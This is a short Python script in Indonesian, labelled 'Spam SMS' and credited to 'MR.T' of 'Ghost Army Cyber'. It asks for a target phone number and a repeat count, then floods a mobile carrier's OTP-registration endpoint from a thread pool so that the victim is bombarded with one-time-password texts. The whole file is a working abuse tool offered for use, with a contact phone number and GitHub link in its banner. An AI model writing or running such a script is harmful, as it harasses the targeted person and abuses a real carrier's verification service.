#!/usr/bin/python
# -*- coding: utf-8 -*-
# Coded by MR.T
"""
ngapai bosq? mau recode?
tinggal pake aja susah amat sih?!
"""
from multiprocessing.pool import ThreadPool
try:
	import os, time, requests, sys
except ModuleNotFoundError:
	print("\nSepertinya module requests BELUM Di Install")
	print("$ pip install requests\n")
	exit()

banner=("""\033[1;36m
\033[1;32mSpam SMS  (UPDATE)
\033[1;36m
 \033[1;31mContact=>089644807091
\033[1;36m
\033[1;31mGithub=>https://github.com/BURIQ2019
\033[1;35m NAMA IS MR.T FOR GHOST ARMY CYBER
""")

os.system('clear')
print(banner)
no = input("\033[1;37mMassukan Nomor Target =>\033[1;32m")
tot = int(input("\033[1;37mJumlah Spam =>\033[1;32m"))
spam = {'msisdn':no}
idk = '200'
def main(arg):
	try:
		r = requests.post('https://registrasi.tri.co.id/daftar/generateOTP?',data = spam)
#		print(r.text)
		if str(idk) in str(r.text):
			print("\033[1;32m[+] SUKSES")
		else:
			print("\033[1;31m[-] GAGAL")
	except: pass

jobs = []
for x in range(tot):
    jobs.append(x)
p=ThreadPool(10)
p.map(main,jobs)
